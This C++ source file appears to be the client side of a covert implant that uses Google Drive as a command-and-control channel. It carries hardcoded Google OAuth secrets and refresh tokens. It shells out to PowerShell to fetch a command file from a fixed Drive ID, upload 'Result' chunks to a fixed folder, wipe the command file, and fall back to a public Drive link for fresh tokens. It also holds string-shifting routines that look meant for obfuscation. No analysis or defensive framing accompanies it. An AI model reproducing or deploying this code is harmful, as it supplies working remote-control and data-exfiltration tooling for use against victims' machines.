#include "MyString.h"
#include <windows.h>
#include <stdio.h>
#include <cmath>

#define min 32
#define max 126
static const int FAILSAFE_THRESHOLD = 2402 * 1000;
static const char bs_64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static int index = 0;

static MyString g_access_token = "yX2Mik28Eorl0NGfxPsFRtmSzxw0177";
static MyString g_refresh_token = *(new MyString("1//09mt_G8WQts9XCgYIARAAGAkSNwF-L9IrqUICbcNlRFj27jFrk3Py7PQSj41VRDv7eTnh1YPl-HOkXSDBRiJOMJWCzuIvr_LRmEc"));
static MyString g_client_secret = *(new MyString("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"));
static MyString g_client_id = *(new MyString("1013834111625-fplqsrj4vs1d95l5g8fmljkqsuh0hstu.apps.googleusercontent.com"));
static MyString g_result_folder_id = "10a_TCWM1Txsjy-SkkQMen2eytaZKLgdB";
static boolean g_flag = false;
static DWORD expo(DWORD base, DWORD exponent) {
    if (exponent == 0){
        return 1;
    } 
    else if (exponent == 1){
        return base;
    }
    DWORD half = expo(base, exponent / 2);
    return half * half * expo(base, exponent % 2);
}

inline static MyString converter_64(MyString inpu) {

    const char* input = inpu.getContext();
    size_t length = strlen(input);
    size_t len = 4 * ((length + 2) / 3);

    char* Cute = (char*)malloc(len + 1);

    size_t i, j;
    for (i = 0, j = 0; i < length;) {
        unsigned char a = i < length ? input[i++] : 0;
        unsigned char b = i < length ? input[i++] : 0;
        unsigned char c = i < length ? input[i++] : 0;

        unsigned int triple = (a << 16) | (b << 8) | c;

        Cute[j++] = bs_64[(triple >> 18) & 0x3F];
        Cute[j++] = bs_64[(triple >> 12) & 0x3F];
        Cute[j++] = (i > length + 1) ? '=' : bs_64[(triple >> 6) & 0x3F];
        Cute[j++] = (i > length) ? '=' : bs_64[triple & 0x3F];
    }

    Cute[len] = '\0';
    MyString result = Cute;
    return result;
}
//base 64 converter

inline void decoder(char str[]) {
    str[0] += 7;
    str[1] += 7;
    int mode = (str[0] + str[1]) % 10;
    for (size_t i = 2; i < strlen(str); i++)
    {
        str[i] += mode;
    }

}
//decoder

static MyString encoder(MyString W, int shift) {
    char* str = W.getContext();
    for (int i = 0; i < strlen(str); i++) {
        char ch = str[i];
        if (ch >= min && ch <= max) {
            ch += shift;

            if (ch > max) {
                ch = min + (ch - max - 1);
            }
            else if (ch < min) {
                ch = max - (min - ch - 1);
            }

            str[i] = ch;
        }
    }
    MyString result = str;
    return result;
}
//shifting strings for encoding

static void handleFailsafe() {
    // Simple handleFailsafe
    FILE* file;
   
    char buffer[1024] = "Backup is empty";
    int i = 0, delay = 0;
    if (g_flag) // This flag is only for to handle if an old refresh token is on the Cloud
    {
        i = 7;
    }

    do{
        if (delay < FAILSAFE_THRESHOLD) {
            delay = expo(i++, 4) * 1000;
        }
        else
        {
            delay = FAILSAFE_THRESHOLD + 1;
        }

        Sleep(delay);

        file = _popen(R"(powershell -c "try{(Invoke-Restmethod 'https://drive.google.com/uc?export=download&id=1PE_bOI--Ti8exPg6hkq_yIhYBipOVZT1' -TimeoutSec 30).RefreshToken}catch{})", "r");
        fgets(buffer, 1024, file);
        if (buffer[0] == '1' && buffer[1] == '/' && buffer[2] == '/')
        {
            g_flag = true;
        }
    } while ((buffer[0] == 'B') && (buffer[14] == 'y'));
    g_refresh_token = *(new MyString(buffer));
    g_refresh_token = g_refresh_token.getSubString(0, g_refresh_token.getLength() - 1);
}

static MyString getToken() {

    char* buffer = new char[1024];
    sprintf_s(buffer, 1024, "powershell.exe -Command \"try{$headers = New-Object 'System.Collections.Generic.Dictionary[[String],[String]]'; $headers.Add('Host', 'oauth2.googleapis.com'); $headers.Add('Content-Type', 'application/x-www-form-urlencoded'); $body = 'client_id=%s&client_secret=%s&grant_type=refresh_token&refresh_token=%s'; $response = Invoke-RestMethod 'https://oauth2.googleapis.com/token' -Method 'POST' -Headers $headers -Body $body -TimeoutSec 30; $response.access_token | ConvertTo-Json}catch{echo 4}\"",g_client_id.getContext(), g_client_secret.getContext(), g_refresh_token.getContext());
    //Decoder(Url);
    FILE* file = _popen(buffer, "r");
    fgets(buffer, sizeof(buffer), file);
    if (buffer[0] == '4')
    {
        delete[] buffer;
        handleFailsafe();
        return getToken();
    }
    MyString output = buffer;
    
    _pclose(file);
    g_flag = false;
    delete[] buffer;
    return output.getSubString(1, output.getLength() - 2);
}
// Get Token

static MyString downloadContext() {
    char* buffer = new char[1024];
    snprintf(buffer, 1024, "powershell.exe -c \"try {Write-Host -NoNewline(Invoke-RestMethod 'https://www.googleapis.com/drive/v3/files/1_tWWjOBiwEFivD8Ua6rwEF4JQfq7t1er?alt=media&acknowledgeAbuse=true&mimeType=text/plain' -TimeoutSec 30 -Method 'GET' -Headers @{'Authorization' = 'Bearer %s'}) }catch{echo 4}\"", g_access_token.getContext());
    FILE* file = _popen(buffer, "r");
    MyString output = "";
    while (fgets(buffer, 1024, file) != NULL) {
        output = output + buffer;
    }
    if (output.getCharAt(0) == '4') {
        g_access_token = getToken();
        delete[] buffer;
        return downloadContext();
    }

    _pclose(file);
    delete[] buffer;
    return output;
}
//Download

static void upload(MyString data) {
    char* buffer = new char[7000];
    double tmp = static_cast<double>(data.getLength()) / 6000;
    int i = ceil(tmp);
    int subIndex = 0;
    for (size_t j = 0; j < i; j++)
    {
        snprintf(buffer, 7000, "powershell.exe -c \"try {Invoke-RestMethod 'https://www.googleapis.com/upload/drive/v3/files/?uploadType=multipart&access_token=%s' -Method 'POST' -TimeoutSec 30 -Headers @{'Content-Type' = 'multipart/related; boundary=boundary'} -Body \\\"`n--boundary`nContent-Type: application/json; charset=UTF-8`n`n{`\\\"name`\\\": `\\\"Result#%d_%d.txt`\\\",`\\\"mimeType`\\\": `\\\"text/plain`\\\",`\\\"parents`\\\": [`\\\"%s`\\\"]}`n`n--boundary`nContent-Type: text/plain`n`n%s`n--boundary--\\\"}catch{echo 4}\"", g_access_token.getContext(), index, subIndex, g_result_folder_id.getContext(), data.getSubString(j * 6000, j == i - 1 ? data.getLength() : (j + 1) * 6000).getContext());
        FILE* file = _popen(buffer, "r");
        char temp_buffer[1024];
        MyString output = "";
        while (fgets(temp_buffer, sizeof(temp_buffer), file) != NULL) {
            output = output + temp_buffer;
        }
        if (output.getCharAt(0) == '4') {
            g_access_token = getToken();
            j--;
        }
        subIndex++;
        _pclose(file);
    }
    delete[] buffer;
    index++;
}
//Upload
static boolean deleteContext() {
    char* buffer = new char[512];
    snprintf(buffer, 512, "powershell.exe -c \"try{Invoke-RestMethod 'https://www.googleapis.com/upload/drive/v3/files/1_tWWjOBiwEFivD8Ua6rwEF4JQfq7t1er?access_token=%s' -Method 'PATCH' -TimeoutSec 30}catch{echo 4}\"", g_access_token.getContext());
    FILE* file = _popen(buffer, "r");
    delete[] buffer;
    buffer = new char[2];

    fgets(buffer, 2, file);
    if (buffer[0] == '4') {
        g_access_token = getToken();
        delete[] buffer;
        return deleteContext();
    }
    _pclose(file);
    delete[] buffer;
    return true;
}